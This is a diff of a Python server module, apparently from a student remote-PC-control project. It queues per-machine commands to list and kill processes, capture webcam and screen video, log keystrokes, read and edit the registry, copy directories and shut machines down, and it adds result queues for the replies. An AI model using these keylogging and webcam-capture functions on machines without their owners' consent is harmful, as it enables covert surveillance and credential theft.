@@ -25,37 +25,51 @@ def list_ip():
     return [elem[1] for elem in conn_ip_list]
 
 action_dictionary = {}
+result_dictionary = {}
 def __init__():
     for i in conn_ip_list:
         action_dictionary[i[1]] = Queue(maxsize=0)
+        result_dictionary[i[1]] = Queue(maxsize=0)
 
 def list_process(ip_address):
-    action_message = lambda conn: (
+    def action_message(conn):
         conn.sendall(bytes("APP_PRO", "utf8")), # NHO DIEN THEM CAI NAY (TRONG FILE CLIENT.PY)
-        app_process_server._list(conn, "PROCESS") 
-    )
+
+        result = app_process_server._list(conn, "PROCESS") 
+        result_dictionary[ip_address].put(result)
+        # print(result)
+
     action_dictionary[ip_address].put(action_message)
 
 
 def list_application(ip_address):
-    action_message = lambda conn: (
-        conn.sendall(bytes("APP_PRO", "utf8")),
-        app_process_server._list(conn, "APPLICATION")
-    )    
+    def action_message(conn):
+        conn.sendall(bytes("APP_PRO", "utf8"))
+
+        result = app_process_server._list(conn, "APPLICATION")
+        result_dictionary[ip_address].put(result)
+        # print(result)
+    
     action_dictionary[ip_address].put(action_message)
 
 def kill_process(ip_address, id):
-    action_message = lambda conn: (
-        conn.sendall(bytes("APP_PRO", "utf8")),
-        app_process_server.send_kill(conn, id)
-    )
+    def action_message(conn):
+        conn.sendall(bytes("APP_PRO", "utf8"))
+
+        result = app_process_server.send_kill(conn, id)
+        result_dictionary[ip_address].put(result)
+        # print(result)
+
     action_dictionary[ip_address].put(action_message)
 
 def kill_application(ip_address, id):
-    action_message = lambda conn: (
-        conn.sendall(bytes("APP_PRO", "utf8")),
-        app_process_server.send_kill(conn, id)
-    )
+    def action_message(conn):
+        conn.sendall(bytes("APP_PRO", "utf8"))
+
+        result = app_process_server.send_kill(conn, id)
+        result_dictionary[ip_address].put(result)
+        # print(result)
+    
     action_dictionary[ip_address].put(action_message)
 
 def capture_webcam(ip_address, time):
@@ -64,13 +78,18 @@ def capture_webcam(ip_address, time):
         conn.sendall(str(time).encode().ljust(BUFSIZ))
 
         # Recv phase
-        size_to_recv = int(conn.recv(BUFSIZ).decode('utf8'))
-        data_to_recv = b''
-        for idx in range(0, size_to_recv, BUFSIZ):
-            r = conn.recv(BUFSIZ)
-            data_to_recv += r
-        data_to_recv = data_to_recv[:size_to_recv] # Remove additional bytes
-        open("./tmp.avi", "wb").write(data_to_recv)
+        try:
+            size_to_recv = int(conn.recv(BUFSIZ).decode('utf8'))
+            data_to_recv = b''
+            for idx in range(0, size_to_recv, BUFSIZ):
+                r = conn.recv(BUFSIZ)
+                data_to_recv += r
+            data_to_recv = data_to_recv[:size_to_recv] # Remove additional bytes
+            # print(data_to_recv)
+            open("./tmp.avi", "wb").write(data_to_recv)
+            result_dictionary[ip_address].put(data_to_recv)
+        except:
+            result_dictionary[ip_address].put('FAIL')
     action_dictionary[ip_address].put(action_message)
 
 def create_video():
@@ -139,35 +158,50 @@ def capture_screen(ip_address):
         for file in files_list:
             os.remove(os.path.join(screenshots_directory, file))
         
+        file_open = open('video.avi', 'rb')
+        file_data = file_open.read()
+        result_dictionary[ip_address].put(file_data)
+        file_open.close()
         
-
     action_dictionary[ip_address].put(action_message)
 
 
 def shut_down(ip_address):
-    action_message = lambda conn: (
+    def action_message(conn):
        # conn.sendall(bytes("SHUTDOWN", "utf8")),
         shutdown_logout_server.shutdown(conn)
-    )
+
+        result = 'OK'
+        result_dictionary[ip_address].put(result)
+
     action_dictionary[ip_address].put(action_message)
 
 def logout(ip_address):
-    action_message = lambda conn: (
+    def action_message(conn):
         shutdown_logout_server.logout(conn)
-    )
+
+        result = 'OK'
+        result_dictionary[ip_address].put(result)
+
     action_dictionary[ip_address].put(action_message)
 
 def restart(ip_address):
-    action_message = lambda conn: (
+    def action_message(conn):
         shutdown_logout_server.restart(conn)
-    )
+
+        result = 'OK'
+        result_dictionary[ip_address].put(result)
+
     action_dictionary[ip_address].put(action_message)
 
 def mac_address(ip_address):
-    action_message = lambda conn: (
-        conn.sendall(bytes("MAC", "utf8")),
-        mac_address_server.mac_address(conn)
-    )
+    def action_message(conn):
+        conn.sendall(bytes("MAC", "utf8"))
+
+        result = mac_address_server.mac_address(conn)
+        result_dictionary[ip_address].put(result)
+        # print(result)
+
     action_dictionary[ip_address].put(action_message)
 
 def keylog(ip_address, time):
@@ -177,8 +211,11 @@ def keylog(ip_address, time):
         sleep(time)
         conn.sendall(b'HOOK'.ljust(BUFSIZ))
         conn.sendall(b'PRINT'.ljust(BUFSIZ))
-        data = conn.recv(BUFSIZ)
-        print(data) # Debug
+
+        data = conn.recv(BUFSIZ)      
+        result_dictionary[ip_address].put(data.decode('utf8'))
+        # print(data.decode('utf8'))
+
     action_dictionary[ip_address].put(action_message)
 
 def registry_list(ip_address, full_path):
@@ -193,7 +230,9 @@ def registry_list(ip_address, full_path):
             r = conn.recv(BUFSIZ)
             data_to_recv += r
         data_to_recv = data_to_recv[:size_to_recv] 
-        print(data_to_recv)
+        result_dictionary[ip_address].put(data_to_recv)
+        # print(data_to_recv)
+
     action_dictionary[ip_address].put(action_message)
         
         # print(data) 
@@ -207,8 +246,11 @@ def registry_update(ip_address, absolute_path, value, data_type):
         conn.sendall(bytes(value, "utf8"))
         conn.sendall(bytes(" ", "utf8"))
         conn.sendall(bytes(data_type, "utf8"))
+        
         ack = conn.recv(BUFSIZ).decode('utf8')
-        print(ack)
+        result_dictionary[ip_address].put(ack)
+        # print(ack)
+
     action_dictionary[ip_address].put(action_message)
 
 def dir_list(ip_address, path_to_folder):
@@ -221,8 +263,11 @@ def dir_list(ip_address, path_to_folder):
         for idx in range(0, size_to_recv, BUFSIZ):
             r = conn.recv(BUFSIZ)
             data_to_recv += r
+        
         data_to_recv = data_to_recv[:size_to_recv] 
-        print(data_to_recv.decode('utf8'))
+        # print(data_to_recv.decode('utf8'))
+        result_dictionary[ip_address].put(data_to_recv)
+
     action_dictionary[ip_address].put(action_message)
 
 def dir_copy(ip_address, src_path, dst_path):
@@ -232,6 +277,8 @@ def dir_copy(ip_address, src_path, dst_path):
         conn.sendall(bytes(src_path, "utf8"))
         conn.sendall(bytes(" ", "utf8"))
         conn.sendall(bytes(dst_path, "utf8"))
+
         ack = conn.recv(BUFSIZ).decode('utf8')
-        print(ack)
+        result_dictionary[ip_address].put(ack)
+        # print(ack)
     action_dictionary[ip_address].put(action_message)
